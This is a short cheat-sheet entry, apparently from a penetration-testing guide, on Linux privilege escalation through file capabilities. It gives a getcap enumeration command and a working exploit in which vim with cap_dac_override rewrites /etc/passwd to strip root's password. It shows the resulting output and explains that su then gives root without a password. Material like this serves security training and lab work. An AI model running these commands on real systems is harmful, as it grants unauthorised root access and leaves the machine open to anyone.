# Permissions-based Privilege Escalation
`The Guide`

- [Capabilities](#capabilities)

## Capabilities
Enumerating Capabilities
```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```
Exploiting Capabilities
```bash
getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip
```
```bash
echo -e ':%s/^root:[^:]*:/root::/\nwq' | /usr/bin/vim.basic -es /etc/passwd
cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash
```
> Now, we can see that the x in that line is gone, which means that we can use the command su to log in as root without being asked for the password.
